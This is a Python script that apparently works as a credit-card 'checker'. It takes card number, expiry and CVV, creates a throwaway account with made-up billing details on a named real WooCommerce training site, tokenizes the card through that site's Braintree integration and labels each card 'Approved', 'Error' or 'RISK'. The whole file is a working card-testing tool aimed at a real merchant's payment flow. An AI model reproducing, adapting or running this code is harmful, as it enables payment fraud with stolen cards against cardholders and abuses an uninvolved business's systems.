import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	import requests, re, base64, random, string, user_agent
	from bs4 import BeautifulSoup
	
	
	
	
	user = user_agent.generate_user_agent()
	
	
	r = requests.session()
	
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=15))
		number = ''.join(random.choices(string.digits, k=4))
		domain = ''.join(random.choices(string.ascii_lowercase, k=7))
		return f"{name}{number}@{domain}.com"
			    
	acc = (generate_random_account())
	
	
	
	def generate_random_code(length=32):
		    letters_and_digits = string.ascii_letters + string.digits
		    return ''.join(random.choice(letters_and_digits) for _ in range(length))
		
	corr = generate_random_code()
	
	
	
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Cache-Control': 'no-cache',
	    'Pragma': 'no-cache',
	    'User-Agent': user,
	}
	
	response = r.get('https://myalftraining.com/user-account/', headers=headers)
	
	
	soup = BeautifulSoup(response.text, 'html.parser')
	nonce_value = soup.find('input', {'id': 'woocommerce-register-nonce'}).get('value')
	
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Cache-Control': 'no-cache',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Pragma': 'no-cache',
	    'User-Agent': user,
	}
	
	data = {
	    'email': acc,
	    'password': 'kfjkssoifjkakjf',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': 'https://myalftraining.com/user-account/',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_session_entry': 'https://myalftraining.com/user-account/edit-account/',
	    'wc_order_attribution_session_start_time': '2024-04-21 04:48:36',
	    'wc_order_attribution_session_pages': '3',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': user,
	    'mailchimp_woocommerce_newsletter': '1',
	    'woocommerce-register-nonce': nonce_value,
	    '_wp_http_referer': '/user-account/add-payment-method/',
	    'register': 'Register',
	}
	
	response = r.post('https://myalftraining.com/user-account/add-payment-method/', headers=headers, data=data)
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Cache-Control': 'no-cache',
	    'Pragma': 'no-cache',
	    'User-Agent': user,
	}
	
	response = r.get('https://myalftraining.com/user-account/edit-address/billing/', cookies=r.cookies, headers=headers)
	
	
	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
	
	
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Cache-Control': 'no-cache',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Origin': 'https://myalftraining.com',
	    'Pragma': 'no-cache',
	    'User-Agent': user,
	}
	
	data = {
	    'billing_first_name': 'Ofvjjyg',
	    'billing_last_name': 'Kyfbut',
	    'billing_company': '',
	    'billing_country': 'US',
	    'billing_address_1': '86 kdjsjd',
	    'billing_address_2': '',
	    'billing_city': 'Glasgow',
	    'billing_state': 'CA',
	    'billing_postcode': '90011',
	    'billing_phone': '3036525896',
	    'billing_email': acc,
	    'save_address': 'Save address',
	    'woocommerce-edit-address-nonce': address,
	    '_wp_http_referer': '/user-account/edit-address/billing/',
	    'action': 'edit_address',
	}
	
	response = r.post(
	    'https://myalftraining.com/user-account/edit-address/billing/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Cache-Control': 'no-cache',
	    'Connection': 'keep-alive',
	    'Pragma': 'no-cache',
	    'User-Agent': user,
	}
	
	response = r.get('https://myalftraining.com/user-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	
	
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
	
	
	client_token_nonce = re.search(r'"client_token_nonce":"(.*?)"', response.text).group(1)
	
	
	
	
	
	
	headers = {
	    'Accept': '*/*',
	    'Cache-Control': 'no-cache',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'Pragma': 'no-cache',
	    'User-Agent': user,
	}
	
	data = {
	    'action': 'wc_braintree_credit_card_get_client_token',
	    'nonce': client_token_nonce,
	}
	
	response = r.post('https://myalftraining.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
	
	
	
	enc = response.json()['data']
	
	decoded_text = base64.b64decode(enc).decode('utf-8')
	
	
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
	
	
	
	
	import requests
	
	headers = {
	    'accept': '*/*',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'cache-control': 'no-cache',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'pragma': 'no-cache',
	    'user-agent': user,
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'ca935889-31fb-4b0d-99b4-154b36aa0177',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	


	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	
	
	
	
	
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Cache-Control': 'no-cache',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Pragma': 'no-cache',
	    'User-Agent': user,
	}
	
	data = [
	
	    ('payment_method', 'braintree_credit_card'),
	    ('wc-braintree-credit-card-card-type', 'visa'),
	    ('wc-braintree-credit-card-3d-secure-enabled', ''),
	    ('wc-braintree-credit-card-3d-secure-verified', ''),
	    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
	    ('wc_braintree_credit_card_payment_nonce', tok),
	    ('wc_braintree_device_data', '{"correlation_id":"'+corr+'"}'),
	    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
	    ('wc_braintree_paypal_payment_nonce', ''),
	    ('wc_braintree_device_data', '{"correlation_id":"'+corr+'"}'),
	    ('wc-braintree-paypal-context', 'shortcode'),
	    ('wc_braintree_paypal_amount', '0.00'),
	    ('wc_braintree_paypal_currency', 'USD'),
	    ('wc_braintree_paypal_locale', 'en_us'),
	    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
	    ('woocommerce-add-payment-method-nonce', add_nonce),
	    ('_wp_http_referer', '/user-account/add-payment-method/'),
	    ('woocommerce_add_payment_method', '1'),
	]
	
	response = r.post('https://myalftraining.com/user-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
	
	
	
	pattern = r'Status code (.*?)\s*</li>'
	
	match = re.search(pattern, response.text)
	
	pattern = r'Status code (.*?)\s*</li>'
	
	match = re.search(pattern, response.text)
	
	
	if match:
		result = match.group(1)
		if 'risk_threshold' in response.text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in response.text:
			result = "1000: Approved"
		else:
			result = "Error"
	

	return result